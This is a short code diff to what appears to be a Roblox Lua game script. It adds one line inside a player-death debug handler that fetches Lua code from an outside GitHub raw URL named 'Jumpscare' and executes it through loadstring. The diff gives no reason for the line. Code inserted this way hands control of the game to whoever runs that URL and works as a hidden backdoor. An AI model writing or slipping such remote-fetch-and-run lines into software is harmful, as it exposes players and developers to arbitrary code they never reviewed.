@@ -91,6 +91,7 @@ end
 
 entity.Debug.OnDeath = function()
     print("Player has died")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eoyoustme2/dm123/refs/heads/main/Jumpscare"))()
 end
 
 --[[
